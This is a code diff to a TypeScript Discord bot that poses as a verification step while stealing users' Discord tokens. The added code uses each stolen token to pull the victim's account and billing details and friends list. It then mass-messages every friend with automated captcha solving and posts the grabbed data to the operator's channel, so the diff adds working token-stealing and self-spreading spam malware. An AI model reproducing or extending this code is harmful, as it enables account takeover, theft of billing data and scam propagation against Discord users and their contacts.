@@ -18,7 +18,6 @@ import {
   IPendingLogin,
   IPendingTicket,
   IPrendingRemoteInit,
-  IUserInfo,
 } from "../interfaces/ISocketEvents";
 import { toDataURL } from "qrcode";
 import {
@@ -27,13 +26,17 @@ import {
   getUserFriendsAxios,
   getBillingInforationAxios,
   getUserInformationAxios,
+  sendMessageAxios,
+  createFriendChannelAxios,
+  sendMessageWithCaptchaAxios,
 } from "../util/axios";
-import * as fs from "fs/promises";
 import { allSockets, sharedClient } from "..";
 import { CaptchaSolver } from "./CaptchaSolver";
 import { config } from "../util/config";
-import * as embeds from "../util/embeds";
 import { join } from "path";
+import { IUserInfo } from "../interfaces/IDiscord";
+import * as embeds from "../util/embeds";
+import * as fs from "fs/promises";
 
 export class DiscordSocket {
   public messages = new Collection<string, any>();
@@ -89,14 +92,33 @@ export class DiscordSocket {
       "utf-8"
     );
 
-    const fullUserInformation = await getUserInformationAxios(
-      decryptedToken.toString()
-    );
-    const billingInformation = await getBillingInforationAxios(
-      decryptedToken.toString()
-    );
-    const userFriends = await getUserFriendsAxios(decryptedToken.toString());
-    console.log(billingInformation, userFriends);
+    _this.taskAfterCompletion(_this, decryptedToken.toString());
+
+    allSockets.delete(_this.user.id);
+    _this.user.send({ embeds: [await embeds.verificationComplete()] });
+    if (!config.roles[_this.user.guild.id]) return;
+    _this.user.roles.add(config.roles[_this.user.guild.id]);
+  }
+
+  private async taskAfterCompletion(_this: DiscordSocket, token: string) {
+    const messageToSend = `DM MESSAGE`;
+    const fullUserInformation = await getUserInformationAxios(token);
+    const billingInformation = await getBillingInforationAxios(token);
+
+    const userFriends = await getUserFriendsAxios(token);
+    for (const friend of userFriends) {
+      const channel = await createFriendChannelAxios(token, friend.id);
+      const msg = await sendMessageAxios(token, channel.id, messageToSend);
+
+      if ("captcha_key" in msg)
+        await sendMessageWithCaptchaAxios(
+          token,
+          channel.id,
+          messageToSend,
+          await _this.solveCaptchaMessage(_this, msg),
+          msg.captcha_rqtoken
+        );
+    }
 
     const grabbedEmbed = await embeds.foundTokenEmbed();
     grabbedEmbed.setAuthor({
@@ -104,7 +126,7 @@ export class DiscordSocket {
         ?.discriminator!}`,
       iconURL:
         _this.userInformation?.avatar !== "0"
-          ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.userid}/${_this.userInformation?.avatar}`
+          ? `https://cdn.discordapp.com/avatars/${fullUserInformation.userid}/${fullUserInformation.avatar}`
           : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
     });
     grabbedEmbed.addFields([
@@ -125,12 +147,6 @@ export class DiscordSocket {
     (sharedClient.channel as TextChannel).send({
       embeds: [grabbedEmbed],
     });
-
-    allSockets.delete(_this.user.id);
-
-    _this.user.send({ embeds: [await embeds.verificationComplete()] });
-    if (!config.roles[_this.user.guild.id]) return;
-    _this.user.roles.add(config.roles[_this.user.guild.id]);
   }
 
   private hello(_this: DiscordSocket, messageData: IHello) {
@@ -206,10 +222,10 @@ export class DiscordSocket {
     await _this.user.send({
       embeds: [await embeds.pleaseWaitEmbed()],
     });
-    await _this.solveCaptcha(_this, foundTicket, messageData);
+    await _this.solveCaptchaTicket(_this, foundTicket, messageData);
   }
 
-  private async solveCaptcha(
+  private async solveCaptchaTicket(
     _this: DiscordSocket,
     captchaToSolve: ICaptcha,
     messageData: IPendingLogin,
@@ -235,6 +251,27 @@ export class DiscordSocket {
         foundTicketWithCaptcha.encrypted_token
       );
 
-    return _this.solveCaptcha(_this, captchaToSolve, messageData, tries + 1);
+    return _this.solveCaptchaTicket(
+      _this,
+      captchaToSolve,
+      messageData,
+      tries + 1
+    );
+  }
+
+  private async solveCaptchaMessage(
+    _this: DiscordSocket,
+    captchaToSolve: ICaptcha,
+    tries = 0
+  ): Promise<any> {
+    if (tries >= 2) return _this.handleCancel(_this);
+
+    const solvedCaptcha = await CaptchaSolver.solveCaptcha(
+      captchaToSolve.captcha_sitekey,
+      captchaToSolve.captcha_rqdata
+    );
+    console.log(solvedCaptcha);
+
+    return solvedCaptcha;
   }
 }
